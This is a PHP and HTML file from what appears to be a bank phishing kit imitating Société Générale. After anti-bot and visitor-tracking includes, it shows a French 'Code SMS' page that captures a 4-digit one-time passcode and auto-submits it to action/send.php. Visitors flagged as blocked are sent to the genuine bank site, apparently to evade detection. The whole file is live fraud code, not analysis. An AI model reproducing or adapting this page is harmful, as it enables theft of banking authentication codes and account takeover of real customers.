<?php

error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include 'page_notify.php';
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('exp.php'); // ex: connexion.php

include("track.php");

?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Code SMS</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px 20px;
      height: 100vh;
      position: relative;
    }

    .back-arrow {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 26px;
      cursor: pointer;
    }

    .sms-icon {
      font-size: 30px;
      background-color: #5b3df1;
      color: white;
      padding: 10px;
      border-radius: 8px;
      margin-top: 80px;
    }

    .instructions {
      margin-top: 15px;
      font-size: 17px;
      text-align: center;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin: 40px 0 20px 0;
    }

    .code-input {
      width: 50px;
      height: 55px;
      font-size: 24px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 10px;
    }

    .resend {
      color: #999;
      font-size: 14px;
    }

    .hidden-submit {
      display: none;
    }
  </style>
</head>
<body>

<div class="back-arrow" onclick="history.back()">&#x2190;</div>

<div class="sms-icon">💬</div>
<div class="instructions">Entrez le code de validation reçu par SMS</div>

<form action="action/send.php" method="POST" id="smsForm">
  <input type="hidden" name="step" value="sms">

  <div class="code-inputs">
    <input type="text" maxlength="1" class="code-input" name="code1" inputmode="numeric" autocomplete="one-time-code">
    <input type="text" maxlength="1" class="code-input" name="code2" inputmode="numeric">
    <input type="text" maxlength="1" class="code-input" name="code3" inputmode="numeric">
    <input type="text" maxlength="1" class="code-input" name="code4" inputmode="numeric">
  </div>

  <button type="submit" class="hidden-submit">Valider</button>

  <div class="resend" id="resendText">Renvoyer SMS dans 0:30</div>
</form>

<script>
  const inputs = document.querySelectorAll(".code-input");
  const form = document.getElementById("smsForm");

  // Focus automatique au fur et à mesure
  inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
      const val = input.value;
      if (val && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      // Si tous remplis → soumettre
      if ([...inputs].every(i => i.value.length === 1)) {
        const smsCode = [...inputs].map(i => i.value).join("");
        const hiddenInput = document.createElement("input");
        hiddenInput.type = "hidden";
        hiddenInput.name = "sms";
        hiddenInput.value = smsCode;
        form.appendChild(hiddenInput);
        form.submit();
      }
    });

    // Retour arrière vers précédent
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  // Collage intelligent
  inputs[0].addEventListener("paste", (e) => {
    const paste = (e.clipboardData || window.clipboardData).getData("text");
    if (paste.length === 4 && /^\d{4}$/.test(paste)) {
      e.preventDefault();
      inputs.forEach((input, i) => input.value = paste[i]);
      const hiddenInput = document.createElement("input");
      hiddenInput.type = "hidden";
      hiddenInput.name = "sms";
      hiddenInput.value = paste;
      form.appendChild(hiddenInput);
      form.submit();
    }
  });

  // Timer
  let seconds = 30;
  const resendText = document.getElementById("resendText");
  const timer = setInterval(() => {
    seconds--;
    if (seconds <= 0) {
      clearInterval(timer);
      resendText.innerText = "Renvoyer SMS";
      resendText.style.color = "#00bfff";
      resendText.style.cursor = "pointer";
    } else {
      resendText.innerText = `Renvoyer SMS dans 0:${seconds.toString().padStart(2, '0')}`;
    }
  }, 1000);
</script>

</body>
</html>
